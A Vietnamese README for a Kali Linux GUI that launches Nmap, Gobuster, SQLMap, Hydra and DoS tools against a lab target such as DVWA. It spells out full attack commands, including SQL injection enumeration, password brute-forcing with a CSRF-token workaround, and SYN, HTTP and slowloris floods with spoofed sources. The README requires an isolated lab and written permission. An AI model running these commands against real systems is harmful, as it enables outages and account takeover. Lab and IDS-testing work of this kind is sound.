# Pentest Lab GUI (Kali Linux)

App giao diện (Python Tkinter — có sẵn trên Kali) để chạy kiểm thử tấn công trong **phòng lab được phép**:
Nmap, SQLMap, Hydra, và bộ DoS (Hping3 / GoldenEye / Slowloris).

## Nguyên tắc hoạt động (đúng yêu cầu)

1. Nhập **IP mục tiêu 1 lần duy nhất** vào ô trên cùng → bấm **⚡ Ping kiểm tra**.
2. App chạy `ping -c 4 -W 2 <ip>`:
   - Ping được → hiển thị **"● IP OK - CÓ KẾT NỐI"**, IP được **khóa** (IPLOCK).
   - Không ping được → hiển thị **"● KHÔNG CÓ KẾT NỐI"** và **không chạy được lệnh tấn công nào**.
3. Sau khi IP khóa, **mọi lệnh tấn công tự động dùng IP đó** — không cần nhập lại:
   - Nmap:     `nmap -sS -T4 -p- <IP>` và `nmap -sV -A <IP>`
   - Gobuster: `gobuster dir -u http://<IP> -w <wordlist>`
   - SQLMap:   `sqlmap -u "http://<IP>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --dbs --level=3` (URL mẫu có `{IP}` tự thay thế)
   - Hydra:    `hydra -l admin -P <wordlist> -s <port> -t 4 -f -I <IP> http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:S=Logout"`
   - DoS:      `hping3 -S --flood -p 80 --rand-source <IP>`, `goldeneye http://<IP> -w 50`, `slowloris <IP> -p 80 -s 500`

> **Lưu ý path**: Linux phân biệt chữ hoa/chữ thường — `/DVWA` khác `/dvwa`.
> App mặc định dùng `/DVWA` (đúng với đa số bản DVWA trên Ubuntu/XAMPP).
>
> **DVWA + CSRF**: DVWA 1.9 trở lên có `user_token` ẩn trong form login. Hydra gửi
> POST tĩnh nên nếu không xử lý token, mọi lần thử đều bị đẩy về login.php với
> "CSRF token is incorrect" và Hydra sẽ **không dừng dù đã gặp mật khẩu đúng**.
> App tự động:
> 1. GET trang login, lấy `user_token` + `PHPSESSID` (ép `security=low`);
> 2. Chạy Hydra với `G=0`, `H=Cookie: PHPSESSID=...; security=low`, `user_token=...`;
> 3. Dùng điều kiện `F=login.php` (redirect khi sai) để token không bị xoay, và
>    tự kill Hydra ngay khi thấy dòng `password: ...` — kể cả khi `hydra -f` không ăn.

## Cài đặt trên Kali

```bash
sudo apt update
sudo apt install -y nmap sqlmap hydra hping3 gobuster

# GoldenEye (HTTP flood) — nếu chưa có
sudo git clone https://github.com/jseidl/GoldenEye.git /opt/goldeneye
sudo ln -sf /opt/goldeneye/goldeneye.py /usr/local/bin/goldeneye

# Slowloris — nếu chưa có
sudo git clone https://github.com/gkbrk/slowloris.git /opt/slowloris
sudo ln -sf /opt/slowloris/slowloris.py /usr/local/bin/slowloris
```

Wordlist mẫu có sẵn trên Kali:
- `/usr/share/wordlists/dirb/common.txt` (Gobuster)
- `/usr/share/wordlists/rockyou.txt` (Hydra — dùng `rockyou.txt.gz` trước nếu file còn nén)

## Chạy

```bash
sudo python3 pentest_lab_gui.py
```

- **Tab "Công cụ"** kiểm tra tool nào đã cài / còn thiếu.
- SYN scan (`-sS`), hping3, slowloris **cần root** → nếu chạy app không phải root, tick ô "Dùng sudo" (app tự prefix `sudo`).
- Tab DoS có ô xác nhận bắt buộc: chỉ tick khi mục tiêu là **server lab cô lập** — DoS làm treo dịch vụ.
- Nút **⏹ Dừng** kill **cả cây tiến trình** (kể cả tiến trình con của `sudo`) bằng
  process group + SIGKILL dự phòng, nên GoldenEye/Slowloris/hping3 dừng thật sự.
- Lệnh được tạo ngay khi bấm chạy (không còn khoảng trễ), bấm **Dừng** lập tức vẫn kill được.
- Đóng cửa sổ app cũng tự kill tiến trình DoS đang chạy, không bỏ rơi tiến trình nền.
- Output được ép không đệm (`stdbuf -oL`, `PYTHONUNBUFFERED=1`) nên log hiện theo thời gian thực.
- hping3 có ô "Thời gian (giây)" — app tự dừng sau số giây đã set (0 = tự bấm Dừng thủ công);
  hẹn giờ cũ tự bị hủy khi chạy lệnh mới nên không kill nhầm.
- hping3 chạy `--flood` **không in từng gói** (chỉ in tổng kết khi dừng) — đây là bình thường,
  không phải lệnh treo. Ô **"Giả nguồn (--rand-source)"** mặc định bật; nếu switch/NAT của lab
  chặn IP giả thì target không thấy traffic — bỏ tick để xác nhận hping3 có gửi/nhận thật.
- hping3 / `nmap -sS` bắt buộc root: hãy chạy `sudo python3 pentest_lab_gui.py` (hoặc tick
  "Tự động thêm sudo"); app sẽ báo rõ nếu `sudo` đang đòi mật khẩu mà không có terminal.

## Lưu ý an toàn & pháp lý

- Chỉ chạy trên hệ thống bạn sở hữu hoặc có **giấy phép thử nghiệm bằng văn bản**.
- Không chạy DoS trên mạng chung/mạng công ty/trường ngoài phạm vi lab cô lập.
- Kết quả Suricata (event_type: flow, sql_keyword_count, login_fail_count, suricata_alert_count...) nên được quan sát trên server IDS lab riêng.
